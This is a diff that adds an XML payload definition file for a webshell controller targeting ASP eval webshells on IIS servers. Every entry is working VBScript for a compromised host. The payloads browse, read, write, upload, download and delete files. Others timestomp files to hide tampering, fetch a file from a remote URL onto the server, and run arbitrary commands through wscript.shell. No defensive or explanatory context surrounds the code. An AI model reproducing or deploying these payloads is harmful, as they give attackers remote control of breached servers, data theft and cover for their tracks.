@@ -1,0 +1,108 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <funcCodeSetting>
+    <func>
+      <name>WwwRootPathCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+      <item><![CDATA[S=Server.Mappath(".")&chr(9):SET FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:For Each D in FSO.Drives:S=S&D.DriveLetter&": ":Next:SET FSO=Nothing:Response.Write(S):End If]]></item>
+    </func>
+    <func>
+      <name>FileTreeCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >dirPath</funcParam>
+      <item><![CDATA[Function FD(dt):Dim f:f=year(dt)&"-"&right("0"&month(dt),2)&"-"&right("0"&day(dt),2):FD=f&" "&right("0"&hour(dt),2)&":"&right("0"&minute(dt),2)&":"&right("0"&second(dt),2):End Function:D=hextostr(Request("$dirPath$")):Set FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:Set FO=FSO.GetFolder(D):For Each F in FO.subfolders:Response.Write(F.Name+"/"+chr(9)&(F.DateLastModified)&chr(9)&"0"&chr(9)&FSO.GetFolder(F.Path).attributes&chr(10)):Next:For Each L in FO.files:Response.Write(L.Name&chr(9)&(L.DateLastModified)&chr(9)&L.size&chr(9)&FSO.GetFile(L.Path).attributes&chr(10)):Next:End If]]></item>
+    </func>
+    <func>
+      <name>ReadFileCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >filePath</funcParam>
+      <item><![CDATA[Dim D:D=hextostr(Request("$filePath$")):Set FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:Response.Write(FSO.OpenTextfile(D,1,False).readall):Set FSO=Nothing:End If]]></item>
+    </func>
+    <func>
+      <name>WriteFileCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >filePath</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >fileContext</funcParam>
+      <item><![CDATA[Dim D,Z2:D=hextostr(Request("$filePath$")):Z2=hextostr(Request("$fileContext$")):Set FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:FSO.CreateTextFile(D).Write(Z2):Set FSO=Nothing:If Err=False Then:Response.Write("1"):End If:End If]]></item>
+    </func>
+    <func>
+      <name>DeleteFileOrDirCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >fileOrDirPath</funcParam>
+      <item><![CDATA[Dim D:D=hextostr(Request("$fileOrDirPath$")):Set FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:If FSO.FolderExists(D)=true Then:FSO.DeleteFolder(D):Else:FSO.DeleteFile(D):End If:Set FSO=Nothing:If Err=False Then:Response.Write("1"):End If:End If]]></item>
+    </func>
+    <func>
+      <name>DownloadFileCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >filePath</funcParam>
+      <item><![CDATA[Dim D,i,c,r:D=hextostr(Request("$filePath$")):Set S=Server.CreateObject("Adodb.Stream"):If Err=False Then:S.Mode=3:S.Type=1:S.Open:S.LoadFromFile(D):i=0:c=S.Size:r=1024:While i<c:Response.BinaryWrite(S.Read(r)):Response.Flush:i=i+r:Wend:S.Close:Set S=Nothing:End If]]></item>
+    </func>
+	<func>
+      <name>UploadFileCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >savefilePath</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >fileHexContext</funcParam>
+      <item><![CDATA[Dim l,ss,ff:ff=hextostr(request("$savefilePath$")):ss=hextostr(Request("$fileHexContext$")):l=Len(ss):Set S=Server.CreateObject("Adodb.Stream"):If Err=False Then:S.Type=1:S.Mode=3:S.Open:Set rs=CreateObject("ADODB.Recordset"):rs.fields.append "bb",205,l/2:rs.open:rs.addnew:rs("bb")=ss+chrb(0):rs.update:S.Write rs("bb").getchunk(l/2):rs.close:Set rs=Nothing:S.SaveToFile ff,2:S.Close:Set S=Nothing:If Err=False Then:Response.Write("1"):End If:End If]]></item>
+    </func>
+    <func>
+      <name>CopyFileOrDirCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >sourceFilePath</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >targetFilePath</funcParam>
+      <item><![CDATA[S=hextostr(Request("$sourceFilePath$")):D=hextostr(Request("$targetFilePath$")):Set FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:If FSO.FolderExists(S) Then:FSO.CopyFolder S,D:Else:FSO.CopyFile S,D:End If:Set FSO=Nothing:If Err=False Then:Response.Write("1"):End If:End If]]></item>
+    </func>
+    <func>
+      <name>RenameFileOrDirCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >oldName</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >newName</funcParam>
+      <item><![CDATA[S=hextostr(Request("$oldName$")):D=hextostr(Request("$newName$")):Set FSO=CreateObject("Scripting.FileSystemObject"):If Err=False Then:If FSO.FolderExists(S) Then:FSO.MoveFolder S,D:Else:FSO.MoveFile S,D:End If:Set FSO=Nothing:If Err=False Then:Response.Write("1"):End If:End If]]></item>
+    </func>
+    <func>
+      <name>CreateDirCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >dirPath</funcParam>
+      <item><![CDATA[S=hextostr(Request("$dirPath$")):Set FSO=CreateObject("Scripting.FileSystemObject"):FSO.CreateFolder(S):Set FSO=Nothing:If Err=False Then:Response.Write("1"):End If]]></item>
+    </func>
+    <func>
+      <name>ModifyFileOrDirTimeCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >fileOrDirPath</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >aTime</funcParam>
+      <item><![CDATA[FN=hextostr(Request("$fileOrDirPath$")):TM=hextostr(Request("$aTime$")):AA=Split(FN,"\"):PT="":For i=LBound(AA) To UBound(AA)-1:PT=PT&AA(i)&"\":Next:NM=AA(UBound(AA)):Server.CreateObject("Shell.Application").NameSpace(PT).ParseName(NM).Modifydate=TM:If Err=False Then:Response.Write("1"):End If]]></item>
+    </func>
+    <func>
+      <name>WgetCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/FileManager</path>
+	  <funcParam location="Body" encrymode="Hex" >fileOrDirPath</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >aTime</funcParam>
+      <item><![CDATA[DP=hextostr(Request("$urlPath$")):SP=hextostr(Request("$aTime$")):Set X=CreateObject("Microsoft.XMLHTTP"):X.Open "GET",DP,0:X.Send():If Err=False Then:Set S=CreateObject("ADODB.Stream"):S.Mode=3:S.Type=1:S.Open:S.Write X.ResponseBody:S.SaveToFile SP,2:Set X=Nothing:Set S=Nothing:If Err=False Then:Response.Write("1"):End If:End If]]></item>
+    </func>
+    <func>
+      <name>SysInfoCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/Cmder</path>
+      <item><![CDATA[Dim root,d:root=Server.Mappath("."):If Mid(root,2,1)=":" Then:d="\":else:d="/":End If:Set WN=CreateObject("WScript.NetWork"):If Err=False Then:Response.Write(root&chr(9)&WN.ComputerName&chr(9)&WN.UserName&chr(9)&d):Set WN=Nothing:End If]]></item>
+    </func>
+    <func>
+      <name>ExecuteCommandCode</name>
+	  <type>aspEval,aspEval_Cookie</type>
+	  <path>/Cmder</path>
+	  <funcParam location="Body" encrymode="Hex" >cmdPath</funcParam>
+	  <funcParam location="Body" encrymode="Hex" >command</funcParam>
+      <item><![CDATA[exe=hextostr(Request("$cmdPath$")):cmd=hextostr(Request("$command$")):Set X=CreateObject("wscript.shell").exec(exe+" /c "+cmd):If Err=False Then:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&E:Set X=Nothing:Response.write(S):End If]]></item>
+    </func>
+  </funcCodeSetting>
+</customShellType>
